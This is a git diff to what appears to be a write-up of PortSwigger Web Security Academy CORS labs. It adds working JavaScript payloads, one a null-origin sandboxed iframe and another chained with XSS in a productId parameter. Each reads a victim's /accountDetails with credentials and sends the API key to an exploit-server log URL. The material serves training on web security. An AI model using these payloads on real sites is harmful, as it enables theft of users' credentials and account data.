@@ -39,7 +39,7 @@ exploit()
 <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
-   req.open('get','$url/accountDetails',true);
+   req.open('get','https://0ab3003204ac868a816da78d0011003f.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
 
@@ -60,7 +60,7 @@ Reference: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted
 In this case the ``null`` Origin value is **whitelisted**. Browsers might send the value ``null`` in the Origin header in various unusual situations, **Sandboxed cross-origin requests** is one of them. So we can reuse the previous exploit and wrap it inside a sandboxed iframe:
 ```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
-    <script>
+<script>
         const exploit = async () => {
             const labBaseUrl = <base_lab_url>;
             const details = '/accountDetails';
@@ -93,6 +93,21 @@ In this case the ``null`` Origin value is **whitelisted**. Browsers might send t
   };
 </script>"></iframe>
 ```
+
+example:
+```javascript
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://0a3000e5049593de80db0de800ee0062.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+    location='https://exploit-0a28004c04da939380840c8e012c0039.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+  };
+</script>"></iframe>
+```
+
 Notice the use of an iframe sandbox as this generates a null origin request.
 6. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
 7. Go back to the exploit server and click "Deliver exploit to victim".
@@ -114,6 +129,9 @@ This website has an insecure CORS configuration in that it trusts all subdomains
 5. Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
 6. Observe that the ``productID`` parameter is vulnerable to XSS.
 7. In your browser, go to the exploit server and enter the following HTML, replacing ``$your-lab-url`` with your unique lab URL and ``$exploit-server-url`` with your exploit server URL:
+
+// document.location="http... AND NOT document.location="https... - FMisi
+
 ```
 <script>
    document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
